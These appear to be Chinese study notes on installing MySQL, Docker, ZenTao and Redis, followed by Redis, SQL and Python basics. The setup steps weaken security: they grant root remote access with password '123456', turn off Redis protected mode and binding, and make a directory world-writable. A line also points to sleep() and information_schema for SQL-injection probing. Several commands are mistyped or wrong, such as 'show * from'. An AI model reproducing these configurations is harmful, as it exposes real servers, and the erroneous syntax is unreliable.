tar -xvf mysql-5.7.14-1.el7.i686.rpm-bundle.tar 
# 安装
rpm -ivh mysql-community-common-5.7.14-1.el7.i686.rpm
rpm -ivh mysql-community-libs-5.7.14-1.el7.i686.rpm
rpm -ivh mysql-community-client-5.7.14-1.el7.i686.rpm
rpm -ivh mysql-community-server-5.7.14-1.el7.i686.rpm
# 启动mysql(service 是一个用于管理系统服务的命令行工具。它允许你启动、停止、重启、查看状态和管理系统服务。)
service mysqld start
# 查找mysql默认密码，并复制
grep 'temporary password' /var/log/mysqld.log 
# 进入mysql，修改密码，并远程授权
mysql -u root -p
# 粘贴密码，密码粘贴后，不会显示，直接敲回车进入如下界面。
	Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
	mysql> 
# 然后依次执行如下语句
    set global validate_password_policy=0;
    set global validate_password_length=1;
    set password for root@localhost=password('123456');
    GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY '123456' WITH GRANT OPTION; # 授权操作
    flush privileges; # 刷新权限
```

### 容器(docker)安装

```shell
# 卸载旧版本(如果安装过旧版本的话)
yum remove docker  docker-common docker-selinux docker-engine
# 安装需要的软件包(yum-util 提供yum-config-manager功能，另外两个是devicemapper驱动依赖的)
yum install -y yum-utils device-mapper-persistent-data lvm2
# 设置yum源
yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo
# 安装docker引擎
yum install -y docker-ce
# 启动docker
systemctl start docker
# 设置docker开机自动启动
systemctl enable docker
# 配置docker镜像加速器
vim /etc/docker/daemon.conf
然后添加如下内容：
{"registry-mirrors": ["http://hub-mirror.c.163.com","https://reg-mirror.qiniu.com"]}
# 重启docker
systemctl restart docker
# 测试，显示版本即表示安装成功
docker version
```

#### 容器(docker)安装mysql8

```shell
# 拉取镜像文件
docker pull mysql:8.0
# 运行MySQL容器(把容器的3306端口映射到linux主机的3307端口，最后连接mysql通过3307端口来连接。因为主机的3306端口可能被占用)
docker run -d -p 3307:3306 --privileged=true -v /docker/mysql8/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=baihe@1234 --name mysql8 mysql:8.0 --lower_case_table_names=1
# 进入mysql8容器(注：容器id通过docker ps -a获取，每个人执行命令出来的结果不一样)
docker exec -it 容器id bash   
docker exec -it 容器名字 bash
# 在容器中操作mysql，使用mysql客户端
mysql -uroot -p
回车，输入密码baihe@1234，进入
# 修改远程连接密码
ALTER USER 'root'@'%' IDENTIFIED WITH mysql_native_password BY 'baihe@1234';
# 退出mysql
exit
# 退出容器
exit
# 使用navicat去连接mysql8.注意端口为3307.ip为Linux主机ip，能连接成功则表示mysql8正常。
```

#### 容器(docker)安装禅道

```shell
# 1.检查防火墙是否关闭和docker是否开启
systemctl status firewalld
ps -ef |grep docker
# 2.拉取禅道
docker pull easysoft/zentao:16.2
# 3.定义禅道
docker run --name zentao -p 80:80 -d easysoft/zentao:16.2
# 4.启动禅道
docker start zentao
# 5.访问禅道
http://ip
# 一键安装方法
1. 到官网下载安装包
2. 上传解压文件
3. 启动/opt/zbox/zbox start
4. 访问ip
# bug 管理工具有禅道、alm、jira、teambition、tapd
```

#### docker安装redis

```shell
1、拉取镜像文件
docker pull redis
2、创建一个目录用于存储redis的文件
mkdir -p /docker/redis/data
3、把目录访问权限设置为任何人都可以访问
chmod -R 777  /docker/redis/data
4、切换目录
cd /docker/redis
5、下载redis.conf配置文件(yum install wget)
wget http://download.redis.io/redis-stable/redis.conf
6、修改配置文件
vi redis.conf
75行左右前面加上#    - 注释掉  bind 127.0.0.1
94行左右yes修改为no   - 把protected-mode yes 修改为protected-mode no
1037行左右  requirepass ZD40fc02d521    # 设置redis密码。密码可以不用设置
7、保存退出
8、启动redis容器
# -p 端口映射。第一个6379指的是linux的端口，第二个6379指的是docker容器的端口
docker run -p 6379:6379 --name redis -v /docker/redis/redis.conf:/etc/redis/redis.conf -v /docker/redis/data:/data -d redis redis-server /etc/redis/redis.conf
9、进入客户端
docker exec -it redis /bin/bash
redis-cli
	# 若设置了密码，则使用redis-cli -a 密码进入
```

- **将一些<font size="3" color="red">复杂操作</font>耗时查出来的结果且确定后面<font size="3" color="red">不怎么变化</font>的数据放到缓存，能大幅提高系统响应**
- redis是一种基于内存的高性能键值型数据库（key-value），属于NoSQL（ Not Only SQL），非关系型数据库,默认端口：6379；

##### redis数据类型



- String（字符串）{“name”:”dinghua”}

  ```shell
  set key value # 创建
  get key # 获取对应建的值
  mset key1 value1 key2 value2... # 批量创建
  mget key1 key2 # 批量获取值
  strlen key # 获取值长度
  append key value # 将值追加到指定存在键的字符串末尾
  getrange key start stop # 获取下标为start到stop的值
  ```

- List（链表）{“stu”:[“liying”,”yanglixiang”,”guoyanglei”]}

  ```shell
  lpush key value1 value2... # 左端存值
  rpush key value1 value2... # 右端存值
  lset key index value # 更新值
  lpop key # 随机弹出
  llen key # 获取列表的长度
  lrange key start stop # 获取下标为start到stop的值
  lindex key index # 获取索引的值
  lrem key count value # 最多删除count个指定的value，0代表所有,正数表示从左端开始，负数表示从右端开始
  ltrim key start stop # 只保留start到end的元素
  ```

  

- set（集合）{“stu”:(“liying”,”yanglixiang”,”guoyanglei”)}

  ```shell
  sadd key value value # 创建
  smembers key # 获取元素
  srandmember key count # 随机获取count个元素
  sismember key value # 判断是否存在该元素
  scard key # 获取元素个数
  srem key value1 value2 # 删除一个或多个元素
  spop key count # 弹出count个值
  ```

  

- zset（sorted-set有序集合）{“stu”:(“liying”,”yanglixiang”,2,”guoyanglei”)}

  ```shell
  zadd key score vlaue score1 vlaue2 # 根据score的值大小从小到大指定vlaue位置
  zscore key vlaue # 获取元素排序值
  zrange key start stop # 获取范围内的值
  	zrange key start stop withscores # 获取范围内的值和排序值
  zrangebyscore key min max withscores  # 获取指定排序值范围内的值和排序值
  	 zrangebyscore key min max withscores limit 0 1 # 获取指定排序值范围内第一个的值和排序值
  zincrby key score member # 增加指定元素分数
  zcard key # 获取集合元素个数
  zcount key min max # 获取在指定范围分数内的元素个数
  zrem key member # 删除指定元素
  zrank key member # 获取元素排名
  ```

  `和列表的区别`：

  - 列表使用链表实现，两头快，中间慢。有序集合是散列表和跳跃表实现的，即使读取中间的元素也比较快。
  - 列表不能调整元素位置，有序集合能。
  - 有序集合比列表更占内存

- hash（哈希类型/散列）：hash表现形式上有些像python中的dict，可以存储一组关联性较强的数据{“stu1”:{“name”:”dinghua”,”age”:18}}

  - ![hash](https://woniumd.oss-cn-hangzhou.aliyuncs.com/test/dinghua/20210309103131.png)

  ```shell
  hset key field value # 创建单个元素
  hmset key field value [field value …] # 创建多个元素
  hget key field # 获取字段值
  hmget key field [field …] # 获取多个字段值
  hgetall key # 获取所有键与值
  hkeys key # 获取所有字段
  hexists key field # 判断字段是否存在
  hlen key # 获取字段数量
  hdel key field [field …] # 删除字段
  ```

  

- key

  ```shell
  keys * # 获取所有key
  del key # 删除指定key
  EXISTS key # 判断key是否存在
  type key # 获取key的类型
  ```

  ##### python操作redis

  ```python
  pip install redis # 安装
  import redis
  ```

  

# Mysql

## 数据库

### 概念

- 数据库(database, 简称 DB)
- 数据库管理阶段：人工管理阶段-文件系统管理阶段-数据库管理阶段
- 关系型数据库

  - 行和列组成的一个二维表

  - 常用关系型数据库:mysql，Oracle, DB2，SQLserver，Pgsql 等
- **结构化查询语言 SQL**
  - 管理关系型数据库的一种语言
  - 查询类语言 DQL  
    - select 查询
  - 操纵类语言 DML(对数据)  
    - insert 插入
    - delete 删除
    - update 更改
  - 定义类语言 DDL(Data Definition Language)(对数据库)
    - create 创建数据库
    - drop 删除数据库
    - alter 更改表结构
    - **rename: 重命名表名**
    - truncate: 清空表, 数据库缓存也一同清除, 但保留表头
  - 控制类语言 DCL(用户)
    - Grant 赋予权限
    - revoke 撤销权限
- 非关系型数据库
  - Nosql: not only sql
    - 不支持 sql 语法
    - 以 key-value 形式存储数据的，如文档、图片
    - 常见：MonggoDB、Redis

### 关系型数据库概念

- 实体: 客观存在的事物, 如一个学生
- 属性: 实体所具有的特性.如学生的学号、性别、出生日期等
- 域: 属性的取值范围.如年龄的范围
- 码: 唯一标识实体的属性集.如学号具有唯一性, 可以据此找到对应学生的其他任何信息
- 实体型: 用实体名及其属性名称 **集合** 来抽象和刻画 **同类** 实体
- 实体集: **同型** 实体的 **集合**
- 联系/关系: 实体与实体之间以及实体与其属性间的关系
  - 实体间联系存在三种情况
    - 一对一
    - 一对多
    - 多对多

### ER图

- 实体：矩形

- 属性：椭圆形

- 关系：菱形，通过无向线连接, 线上注明实体间联系的情况

<img src="测试开发.assets/image-20230709185413226.png" alt="image-20230709185413226" style="zoom:50%;" />

### 数据库范式

1. 1NF: 第一范式
   - 实体属性是不可分割, 因此数据表每个列必须是原子的，即不能包含多个值或重复的值。每个表中的每个列都应该具有原子性。
2. 2NF: 第二范式
   - 表中必须要有主键, 主键值 **是唯一的**, **并且不能为空**, 其他字段必须依赖于主键, 即可以用主键找到其他所有字段.
3. 3NF: 第三范式
   - 确保每一列都跟主键直接相关, 不能间接相关, 用于拆表
4. **第一范式消除重复数据，第二范式消除部分依赖，第三范式消除传递依赖**

## 操纵

### 基础

- <font size="3" color="red">代码部分输入完成后必须在尾部输入分号, 表示结束 </font>
- <font size="3" color="red">mysql 命令不区分大小写</font>

### 登录

```mysql
1.本地默认端口登录
mysql -u 用户名 -p
2.指定ip或端口登录
mysql -h host -P poty -u user_name -p
```

### 数据库和表的增删改查

#### 查

```mysql
1.查看所有数据库
show databases;
2.使用数据库
use 库名;
3.查看库下面的表
show tables; 
# 初始四个数据库
    # information_schema 存放数据库对象信息,用户表信息,列信息
    # mysql 存储数据库用户,用户访问权限的数据
    # performance_schema 数据库服务性能参数
    # sys 提供了视图的功能,来源performance_schema
4.查看表的结构
desc 表名
5.模糊匹配like,匹配符 %(多个字符); _(一个字符)
show tables like 'a%' # 搜索以a开头的所有表
show tables like 'a__' # 搜索以a开头且共三个字符的表
6.查看字符集
show character set;
7.查看数据库和表的字符集
show create database 库名
show create table 表名
8.查看表的数据
select * from 表名 # 表数据
```

#### 创建

```mysql
1.创建数据库
create database 库名
# 库名唯一,且以字母开头,不能使用汉字、特殊字符
2.创建表
use 库名
create table 表名(
字段名1 类型1,
字段名2 类型2,
...
字段名n 类型n
)engine 保存引擎 character set 字符集
"""
表的类型
    数字类型:int、float
        int:tinyint范围(-128,127)
            smallint、mediumint、int、bigint
        float 单精度浮点数值
        double 双精度浮点数值
    字符串类型:
    	char():定长字符串,大小固定
    	varchar():可变字符串,大小随实际,不可超过范围
    	tinyblob:不超过255个字符的二进制字符串
    	tinytext:短文本字符串
    	blob:二进制长文本数据
    	text:长文本数据
    	mediumblob:二进制中等文本数据
    	mediumtext:中等文本数据
    	longblob:二进制极大文本数据
    	longtext:极大文本数据
    日期类型:
    	date:格式 YYYY-MM-DD
    	time:格式 HH:MM:SS
    	year:格式 YYYY
    	datetime:格式 YYYY-MM-DD HH:MM:SS
    	timestamp:格式 YYYYMMDDHHMMSS 
"""
```

#### 修改

```mysql
1.更改数据库的字符集
alter database 库名 character set 字符集;
2.更改表的字符集
alter table 表名 convert to character set 字符集;
3.更改表名
alter table 旧表名 rename to 新表名;
alter table 旧表名 rename as 新表名;
4.表中插入数据
insert into 表名 values(值1,值2...,值n) ;
insert into 表名 (字段名1,字段名2,...字段m) values(值1,值2,...值n);
insert into 表名 (字段名1,字段名2,...字段m) values(值1,值2,...值n),(值1,值2,...值n),(值1,值2,...值n)....;
# 值的个数跟字段名数必须一致
5.更改表中数据
update 表名 set 字段名=新值 where 字段名 = 旧值;
6.删除某一条数据
delete from 表名 where 条件;
7.清空表数据
delete from 表名;
truncate 表名;
8.更改表字段名
alter table 表名 change 旧字段名 新字段名 数据类型;
9.更改表类型
alter table 表名 change 字段名 字段名 新数据类型;
alter table 表名 modify 字段名 新数据类型;
10.表增加一个字段
alter table 表名 add 字段名 数据类型;
11.表删除一个字段
alter table 表名 drop 字段名;
12.复制表的结构
create table 新表名 like 已有表名
13.复制(备份)表
create table 新表名 as (select * from 已有表名)
14.删除库和表
drop database 库名
drop table 表名
```

###### 总结

- create 和 alter 后面跟数据库/表类型
- **drop 用于删除对象，数据库、表、表字段。字段不跟类型，其他跟类型**
- delete 和 select 有 from
- update 和 truncate 直接跟名字
- drop、delete、truncate 的区别
  - "drop" 用于删除数据库对象，如表、视图等。
  - "delete" 用于删除表中的行数据，并可以使用 WHERE 子句指定条件。
  - "truncate" 用于删除表中的所有行数据，快速截断表。

### 表的七大约束

```mysql
1.非空(not null)
create table 表名(字段名 类型 not null);
# 空对象null和空字符''的区别
# 空对象null没有存储数据,但占用内存,用is null进行确定,is not null表示不为空
# 空字符长度为0但占用存储,用 = 确定

2.唯一约束(unique)
create table 表名(字段名 类型 unique)
3.主键(primary key)唯一且不能为空
    3.1	create table 表名(字段名 类型 primary key)
    3.2	create table 表名(字段名 类型,primary key(字段名))

4.默认值(default) # 指定默认值时不需要括号
create table 表名(字段名 类型 default 默认值)

5.自增长(auto_increment)
# 一般情况下跟主键结合使用,该字段不写或写NUll都可以比上一个数据值自动增加1
# delete删除的数据是可以找回的,因此即使使用delete删除数据后仍然会在此数据基础上加1,但使用truncate是不会的
create table 表名(字段名 类型 primary key auto_increment)
create table 表名(字段名 类型,primary key auto_increment(字段名))

6.检查约束(check)
# 在mysql中,check无用,因此用enum(枚举)代替,无需指定类型
create table 表名(字段名 enum(值1,值2...))

7.从键约束
# 在从表中,有一个字段引用了主表的主键
create table 表名1(字段名1 类型 primary key,字段名2 类型)
create table 表名2(字段名1 类型 primary key,字段名2 类型)
create table 表名3(字段名1 类型 字段名3 类型,
                 foreign key (字段名1) references 表名1(字段名1),
                 foreign key (字段名3) references 表名2(字段名3), .....)
```

### 表的进阶查询

```mysql
1.查询所有字段
show * from 表名
2.查询部分字段
show 字段名1,字段名3 from 表名
3.给部分字段起别名
show 字段名1 名1,字段名3 名1 from 表名
show 字段名1 as 名1,字段名3 as 名1 from 表名
4.查询所有相同数据所在行的信息
show * from 表名 where 数据名1,数据名2
5.比较运算符 >,<,>=,<=,!=(<>),在某数值区间也可以用between 值1 and 值2 # between为闭区间
6.关系运算符not,or,and # 用于where # 优先级 not>and>or
7.集合 字段名 in (值1,值2,...) 等同于 字段名 = 值1 or 字段名 = 值2...
  # not in 表示不在
8.`ifnull(字段名,设定值) `表示当字段名的值为null时,则使用设定值,不为null就用其原值
9.limit m,n 表示从第m行(从0开始数,可省略),取n条数据
10.like 表也可以用模糊匹配,其用法不变
11.求字符串的长度 select length(字符串)
12.排序 order by 字段名 asc # 正序,asc可省略
	   order by 字段名 desc # 倒序
	   order by 字段名,字段名2 desc # 先根据字段名正序,然后再根据字段名2倒序
13.分组 group by 字段名 # 通常跟聚合函数和having一起使用
14.聚合函数:
	count(字段名或*) # 计算非null数据个数
	sum(字段名) # 求和
	avg(字段名) # 平均值
	max(字段名) # 最大值
	min(字段名) # 最小值
15.having # 用于对使用了group by 的结果进行再次筛选，相当于where
SELECT department, COUNT(*) as employee_count
FROM employees
GROUP BY department
HAVING COUNT(*) > 5;
# 在上面的示例中，我们计算每个部门的员工数量，并使用HAVING函数筛选出具有超过5个员工的部门。
16.去重distinct
select distinct 字段1，字段2 from 表
17.针对日期时间取对应年月日等
year(日期字段) --取年
month(日期字段) --取月
day(日期字段) --取日
18.计算日期/时间之间的差值
timestampdiff(unit, start_datetime, end_datetime)
# unit 是表示时间单位的参数，可以是 YEAR、MONTH、DAY、HOUR、MINUTE 或 SECOND。
# start_datetime 是开始日期或时间。
# end_datetime 是结束日期或时间。
19.SQL语法顺序
SELECT：指定要检索的列或表达式。
FROM：指定要检索数据的表或视图。
WHERE：指定用于筛选数据的条件。
GROUP BY：指定要进行分组的列。
HAVING：指定对分组进行筛选的条件。
ORDER BY：指定对结果进行排序的列。
LIMIT：指定返回结果的行数。
20.数值取整函数
round(x, d) # 对 x 进行四舍五入，并保留 d 位小数。如果 d 参数被省略，则默认为 0，表示对整数部分进行舍入。
ceil(x) # 向上取整。
floor(x) # 向下取整。
TRUNCATE(x, d): 截断 x，保留 d 位小数。与 ROUND 不同，TRUNCATE 不进行四舍五入，而是直接截断。
GROUP_CONCAT(字段) # 将多行数据中的某个字段的值合并为一个字符串，返回值长度有限制，默认为1024字节，可通过 SET group_concat_max_len = new_value;来改变字节数
CONCAT_WS(分隔符,字段名,字段名....) # 用于将字段名对应的字符串连接起来，并在它们之间插入一个指定的分隔符
database() # 获取当前表所在的数据库
version() # 这个函数返回数据库的版本信息。
user() # 返回当前数据库连接的用户的用户名。类似current_user()
@@version 或 @@version_comment # 返回数据库的版本信息。
count(*) #  用于计算返回的行数，通常用于判断表是否存在。
information_schema 数据库： # 用于获取关于数据库对象(表、列、约束等)的元数据信息。
        # TABLES 表可以获取对应库的表名
        # COLUMNS 表可以获取对应库对应表的字段名
sleep() # 用于暂停查询的执行，可以用于检测延迟型注入。
库名.表名 # 引用一个特定数据库中的表
-- # 注释
```

### 组合表

```mysql
1.交叉连接，产生数据是一个笛卡尔积，存在大量无效数据，在测试和调试、数据集扩展才可能会用
select * from 表1 cross join 表2 
2.关联查询
select * from 表1 cross join 表2 where 表1.字段名 = 表2.字段名
select * from 表1,表2 where 表1.字段名 = 表2.字段名
select 缩写表1名.字段名,缩写表2名.字段名 from 表1 缩写表1名,表2 缩写表2名 where 缩写表1名.字段名 = 缩写表2名.字段名
3.内连接inner join .... on ..,查询结果跟关联结果一样,但速度快,等同于join
select * from 表1 缩写1 inner join 表2 缩写2 on 缩写1.字段名 = 缩写2.字段名 inner join 表3 缩写3 on 缩写1.字段名 = 缩写3.字段名 where/ group by / order by / 
4.左(右)连接(`又称为外连接`) `左(右)连接返回左(右)边表的所有行，以及与右(左)边表中匹配的行。若左(右)表中的某行在右(左)表中没有匹配的行，则以NULL进行填充`
左连接通常用于保留左表中的所有数据，并获取与左表相关联的右表数据，即使有些左表的行在右表中没有匹配。
left join 左连接
right join 右连接
5.子查询返回的是布尔值的函数
exists/ not exists # 只关心是否有结果
# exists 某种情况可以替代in,在用exists代替时要注意,要把子查询表跟父表进行关联
SELECT column1
FROM table1
WHERE EXISTS (
    SELECT 1
    FROM table2
    WHERE table1.column1 = table2.column2
);
# 父表大，子表小-用in
# 父表小，子表大-用exists
6.any、some、all
7.纵向连接（横向数据变纵向）
union `自带去重`
union all `重复数据也显示出来`
where 字段 from 表名 union select 字段 from 表名2
8.横向连接（纵向数据变横向）
SELECT 姓名,
       MAX(CASE WHEN 科目 = '语文' THEN 成绩 END) AS 语文成绩, # 按姓名分组后当科目列的值为语文时，则对应显示成绩列的行值，并作为新表语文成绩的值
       MAX(CASE WHEN 科目 = '数学' THEN 成绩 END) AS 数学成绩,
       MAX(CASE WHEN 科目 = '英语' THEN 成绩 END) AS 英语成绩
FROM scores
GROUP BY 姓名;

```

### 视图、索引、事务

```mysql
1.视图(view)(可以动态查看查询的结果)
# 创建视图
create view name as (select 条件 from 表名)
# 查询视图
select * from view
# 更改视图
alter view name as (select 条件 from 表名)
# 删除视图
drop view name
2.索引(index)(用于提高查询速度和加快数据检索的效率,类似书籍的目录)
# 索引可以分为:
# 主键索引(Primary Key Index)：主键索引用于唯一标识表中的每一行数据，确保主键值的唯一性。主键索引可以加速主键的查找和连接操作。
# 唯一索引(Unique Index)：唯一索引保证了索引列的唯一性，不允许重复值。与主键索引不同，唯一索引列可以有空值(NULL)，但只允许一个空值。
# 普通索引(Index)：普通索引是最常用的索引类型，用于加速查询和搜索操作。它没有唯一性的限制，允许重复值和空值。
# 全文索引(Full-Text Index)：全文索引用于全文搜索，支持对文本内容进行高效的关键字搜索。它可以对文本字段(如文章内容)创建索引，使得搜索操作更加快速和准确。
# 复合索引(Composite Index)：复合索引是基于多个列的索引，可以加速多列条件的查询。复合索引的选择应根据查询的频率和条件进行优化，以确保索引的有效性。
# 创建索引
create index index_na on table_name(column_name)
# 删除索引
drop index index_name on table_name(column_name)
#查看索引
SHOW index FROM table_name;
3.事务(transaction)(特性:原子\一致\永久\隔离)
start transaction:
事务命令
commit; # 无错误就更改
rollback; # 有错误就返回，不进行更改
```





# python

## 基础知识

1. 标识符命名规则
   - 第一个字符必须是字母或下划线‘_’
     - 其他的部分由字母，数字和下划线组成

   - 标识符 **区分大小写**
   
   - 标识符不能使用 **关键字**
     - 小驼峰式: 第一个单词首字母小写；后续单词首字母大写
     
     - 大驼峰式: 每个单词首字母大写
     
     - 下划线“_”式命名法 (以下划线开头)
     
     - 关键字列表
     
       ```python
       import keyword
       keywords = keyword.kwlist
       print(keywords)
       ```
     
       
   
2. 快捷键

   1.  ctrl+/ 可快速注释多行
   2.  按住 ctrl 点击函数可以查看源代码
   3.  ctrl+d 复制当前行
   4.  ctrl+shift+上下键 移动该行
   5.  Alt+Enter 快速导入模块

## 命令

### print

```python
print(values1,values2,....[,sep = '间隔符',end = '结尾符',file = sys.stdout])
	# file = sys.stdout,默认为输出数据流,将file = '文件路径',可以将打印的内容追加写入到文件中
    # \n 换行符
    # \t 制表符,使得输出呈现为一个简单的表格形式。
    # \r 光标返回行首,依次覆盖字符(在pycharm中,是直接覆盖掉行)
    	# 想要直接输出引号，需要加上转义符'\',如 \\ 输出\ 
        # 或者使用r或R
        
# 格式化输出
a = 'hello world'
b = 'python'
print(f'第一个编程命令是{a}')
print('第一个编程命令是{}'.format(a)) 
	# format内容也可以用下标或别名表示,此时{}和变量可以不一一对应
    print('第一个编程命令是{1}，用{0}语言编写的'.format(b,a)) # 1和0是b和a的下标
	print('第一个编程命令是{c}，用{l}语言编写的'.format(l = b,c = a))
    # {变量:wd.qf/s/d}
        # ：
            # w表示宽度,为数字,若字段实际长度小于指定宽度，默认用空格字符(或w前的单个字符,非>、^、<)填充字段以满足指定的宽度。大于则显示实际长度.
              # w前面可加 >(右对齐),^ (居中对齐),不加或<(左对齐)
                 # 左对齐:lijust(位数,填充符);右对齐:rijust(位数,填充符);居中对齐:center(位数,填充符);
            # q为数字
                # .qf 表示浮点数据的小数点精度,格式为.数值f
                # .qs 按照字符串的方式对值进行格式化，字符串值超过保留q字符，未超过原样输出
                # .qd 按照整数的方式对值进行截断格式化，并保留q位整数

print('第一个编程命令是%s/d/f，用%s/d/f语言编写的'%(a,b))
	# % 占位符
        # d: 整数
        # s:字符串
        # f:浮点数
print(type(变量)) # 输出变量的类型
# 固定位数显示
print(format(a,'0>5')) # 0' 表示用 '0' 来填充空白，'>' 表示右对齐，'5' 表示总宽度为 5。也可通过zfill()函数实现 
# 彩色打印(转义序列 \033[显示方式；前景色；背景色m )
print('\033[1;47;31mhello\033[0mworld') 
# 显示方式:0 终端默认设置; 1 高亮显示;3 使用下划线;5 闪烁; 7 反白显示;8 不可见
# 前景色(背景色):30(40)黑色;31(41)红色;32(42)绿色; 33(43)黄色;34(44)蓝色;35(45)紫红色;36(46)青绿色;37(47)白色
#             
#                   
```

### input

```python
# 输入
input
	# 可将多条输入语句放在列表、元组或字典中
    data = [input('姓名:'),input('电话:'),input('学校:')]
    # 多变量接收多值
    name,age = input('请输入姓名和年龄,并用英文逗号分隔:').split(',')
    # 首字母大写
    input().capitalize()
    # 所有单词首字母大写
    input().title()
    # 限制输入特定范围的字母、数字,可以穷举列表,也可以用ASCII表
```

### 六大类型

```python
#不可变类型:str、number、tuple,可变类型list、set、dict
    # 针对不可变类型的修改均需要一个变量去接收结果
    # 除number以外的5大类型均为可迭代类型,集合和字典无下标概念.
    	sorted(iterator[,reverse = True])(排序,返回一个新列表)和reversed(逆置,返回一个迭代器)对所有的可迭代类型都有效
    # 空白字符:没有实际字符内容的字符。包括空格(' ')、制表符('\t')、换行符('\n')、回车符('\r')、垂直制表符('\v')和换页符('\f')。
```

#### 索引

```python
# 索引 str/list/tuple[下标]  下标必须取到值,无则报错
	# 切片 
    	str/list/tuple[起始:终止:步长] 起始可取到,终止取不到(左闭右开)
		str/list/tuple[起始:] 起始取到末尾
        str/list/tuple[:终止] 开头取到(终止-1)位
        str/list/tuple[::-1] 逆置,返回一个新对象
			# 先看步长的方向，再看区间的取值方向，如果一致就可以取，不一致为空
    #查
    	str/list/tuple.index(元素) # 返回元素下标,无则报错
        	str.find[字符]/str.rfind[字符] # 从左到右/从右到左,第一个符合条件字符的下标,无则返回-1
    	str/list/tuple.count(元素) # 获取元素出现的次数
    	元素 in list/tuple/str/set/dict # 返回True或False
```

#### 数字(number)

```python
# 数字 number
	int float complex # complex 复数 
	True False # python的布尔类型大小写不能错,且True表示1,Flase表示0
```

#### 字符串(str)

```python
# 查询类
    r(str)/R(str)  # 可原封不动的输出字符串
    
# 判断字符串是否满足某些特定的条件,满足条件返回True,不满足为False
    str.startswith(字符,start,end) # 检测str[start]到str[end]之间是否以字符开头
    str.endswith(字符,start,end) # 检测str[start]到str[end]之间是否以字符结尾
    str.isalnum() # 判断字符串是否由字母和数字组成，且至少包含一个字符(alnum = "alpha-"(字母数字)的缩写)
    str.isdigit() # 用于判断字符串是否只包含数字字符。
    str.isalpha() # 用于判断字符串是否只包含字母字符和文字(不包括空格、数字和特殊字符)。
    str.islower() # 用于判断字符串中的所有字母是否都为小写字母。
    str.isupper() # 用于判断字符串中的所有字母字符是否都为大写字母。
    str.isspace() # 用于判断字符串是否只包含空白字符(空格、制表符、换行符等)。
    
# 修改类
    str.replace[旧字符,新字符] # 替换所有符合条件的旧字符,得到的是个新str,一次只能替换一种类型,
                             # 可以多次使用
    str.splid(字符) # 以该字符对str进行切割,默认为空白字符,得到新list
    str.strip() # 去除str两边的空白字符
                    # lstrip() 左侧
                    # rstrip() 右侧
    str.upper()/str.lower() # 小写字母变大写字母/大写字母变小写字母
    str.title() # 首字母大写，小字母仍是小字母
    字符/字符串.join(str/list/tuple/set/dict) # 将前面的字符或字符串填充到后面的str下标间或列表/元组的值间,set的所有值必须可哈希才可以用,dict默认连接键,dict.values可以连接值
```

#### 列表(list)

```python
# 空列表
    a = []
    a = list()
	# 增加
    list.append(元素) # 将元素添加到list尾,直接更改原列表，一次只能加一个 
    list.extend(元素) # 将元素逐一添加到列表尾
    				  # list1+list2相当于list1.extend(list2)
    list.insert(下标,元素) # 将元素插入到列表下标处
    
    # 删除
    list.pop(下标) # 返回下标的值，如果不写下标默认为-1
    list.remove(值) # 不返回值，一次只能删一个,无则报错
    list.claer() # 清空列表
    del list # 删除列表，也指定下标
    
    # 改
    list[下标] = 值
    
    # 排序
    list.sort([reverse=True]) # 修改原列表,从小到大[从大到小]
    sorted(list[,reverse=True]) # 不修改原列表,从小到大[从大到小]
    
    # 逆置
    list[::-1] # 逆置列表,常用,形成新列表
    list.reverse() # 逆置列表,不常用,更改原列表
    reversed(list) # 逆置列表,形成新列表
    # 解包列表
    *list 
    
    # 列表推导式
    new_list = [expression for item in iterable if condition]
        '''
        expression：要对每个元素执行的操作。
        item：可迭代对象中的元素。
        iterable：要迭代的可迭代对象。
        condition：(可选)条件，用于过滤元素
        '''
    """
    列表相乘替换
    x= [[1,2]]
	x=x*3
	x[0][0]=5
	x = [[5, 2], [5, 2], [5, 2]]
	# 涉及到Python中的引用和复制的概念。
	x = x * 3 这一行会将列表 x 复制三次，得到一个新的列表，其中每个元素都是指向原始子列表 [1, 2] 的引用。也就是说，这三个子列表实际上指向同一个内存位置，它们共享相同的数据。
	因此，执行 x[0][0] = 5时，实际上在改变这个共享的子列表的值。这会影响所有引用该子列表的地方。所以最终输出为 [[5, 2], [5, 2], [5, 2]]
    """
```



#### 元组(tuple)

```python
# 元组只能查和逆置
	# 空元组
    a = ()
    a = type()
    # 一个元素的元组，多个元素时结尾也可以有,
    a = (1,)
```

#### 集合(set)

```python
# 集合会自动去重且元素必须为不可变类型，没有下标的概念。集合可以视为无序也可以为有序：无序在于设置一个集合后，其会进行无序排序，有序在于如果两次设置的集合元素一致，其无序排序后生成的集合是一致的
	# 空集合
    a = set()
    # 增
    set.add(元素) # 添加单个元素
    set.update(序列) # 添加多个元素
    # 删
    set.pop() # 只能弹出第一个元素
    set.remove(元素) # 删除指定值,不存在则报错
    set.discore(元素) # 删除指定值,无不报错
    set.clear() # 清空集合
    # 排序
    sorded(集合,reverse = True) 
    # 查
    set1 & set2 # 查交集 1和2的共同元素
    set1 | set2 # 查并集 1和2的所有元素
    set1 - set3 # 查差集 属于1但不属于2的元素 
    set1 ^ set2 # 对称差集 属于1或属于2,但不共同属于1和2的元素
        """
        列表a=[3，5，8，9],列表b=[4,5,7,3,2,6],找出a列表和b列表中共有的元素及a列表和b列表中特有的元素
        """
        jiaoji = set(a)&set(b) 	# 需要先将a列表和b列表转为集合a和集合b
        bingji = set(a)|set(b)  # 需要先将a列表和b列表转为集合a和集合b
    	
        """
        集合推导式跟列表推导式类似，只是把中括号改为了花括号
        """
```

#### 字典(dict)

```python
# 格式{键1：值1，键2：值2，....},键只能是不可变类型，且无法重复。无序对象，无下标概念，通过键来查询。且可以嵌套任意深度的值
    # 不指定取字典的值，默认取字典的键
    # 空字典
    a = {}
    # 增
    dict_1.update(dict_2) # 将dict_2的数据覆盖到dict_1中
    dict[不存在的键] = 值 # 键存在可以更新值
    # 改
    dict[键] = 新值
    # 查
    dict[键] # 不存在即报错
    dict.get(键名,default) # 存在返回键名,不存在返回设置的default,省略default返回None
    # 删
    dict.pop(键)
    dict.popitem() # 弹出字典的最后一个键对值
    dict.clear()
    del dict # 删字典，也可以指定键名
    # 解包字典
    **dict
    # 常用函数
    	dict.key() # 获取字典的所有键,非列表类型,为dict_keys类型
        dict.values() # 获取字典的所有值,非列表类型,为dict_values类型
        dict.items() # 获取字典的所有键值对,非列表类型,为dict_items类型
        
    # 两个列表创建字典
    dict_name = dict(zip(list1,list2))
        #dict 转换为字典
